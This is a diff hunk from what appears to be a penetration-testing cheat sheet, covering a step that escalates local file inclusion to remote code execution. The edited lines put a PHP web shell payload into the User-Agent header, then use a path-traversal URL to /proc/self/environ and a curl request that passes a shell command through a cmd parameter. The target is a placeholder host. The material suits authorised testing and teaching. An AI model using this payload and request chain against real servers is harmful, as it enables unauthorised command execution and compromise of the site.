@@ -377,7 +377,10 @@ Testing
 http://secureapplication.example/index.php?view=../../../proc/self/environ
 `  
 
-if it works put `GET /<?php system($_GET['cmd']);?>` in the user-agent field then run request 2 like payload
+if it works put `<?php system($_GET['cmd']);?>` in the user-agent field then run request with 
+` curl 
+http://secureapplication.example/index.php?view=../../../proc/self/environ&cmd=ipconfig
+` 
 
 # **<a name="rfi2rce">RFI to RCE</a>**
 
